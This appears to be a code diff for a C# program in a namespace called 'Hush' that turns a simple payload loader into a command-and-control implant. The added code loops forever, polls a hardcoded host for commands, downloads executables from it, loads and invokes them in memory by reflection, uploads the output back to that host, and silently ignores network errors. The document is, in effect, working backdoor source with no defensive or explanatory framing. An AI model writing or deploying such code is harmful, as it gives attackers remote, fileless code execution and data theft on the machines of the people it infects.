@@ -13,26 +13,36 @@ namespace Hush
     {
         static void Main(string[] args)
         {
-            // Fetch the payload
-            byte[] managedAssemblyBytes = new System.Net.WebClient().DownloadData("http://192.168.100.5:9999/FetchCurrentUser.exe");
+            while (true)
+            {
+                try
+                {
+                    string command = new System.Net.WebClient().DownloadString("http://192.168.100.5:9999/command");
 
-            // Load it in a ManagedAssembly
-            Assembly managedAssembly = Assembly.Load(managedAssemblyBytes);
+                    if (command != "")
+                    {
+                        // Fetch the payload
+                        byte[] managedAssemblyBytes = new System.Net.WebClient().DownloadData("http://192.168.100.5:9999/" + command + ".exe");
 
-            // Fetch the Entry Point
-            //MethodInfo entryPoint = managedAssembly.EntryPoint;
+                        // Load it in a ManagedAssembly
+                        Assembly managedAssembly = Assembly.Load(managedAssemblyBytes);
 
-            // Fetch the Execute method
-            Type exec = managedAssembly.GetType("Program");
-            MethodInfo entryPoint = exec.GetMethod("Execute", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static);
+                        // Fetch the Entry Point
+                        //MethodInfo entryPoint = managedAssembly.EntryPoint;
 
-            // Invoke it
-            string retVal = (string)entryPoint.Invoke(null, new object[] { });
+                        // Fetch the Execute method
+                        Type exec = managedAssembly.GetType("Program");
+                        MethodInfo entryPoint = exec.GetMethod("Execute", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static);
 
-            // Write back the result
-            Console.WriteLine(retVal);
-            Console.ReadLine();
+                        // Invoke it
+                        string retVal = (string)entryPoint.Invoke(null, new object[] { });
 
+                        // Send back the response
+                        new System.Net.WebClient().UploadString("http://192.168.100.5:9999/", retVal);
+                    }
+                }
+                catch (WebException ex) {}
+            }
         }
     }
 }
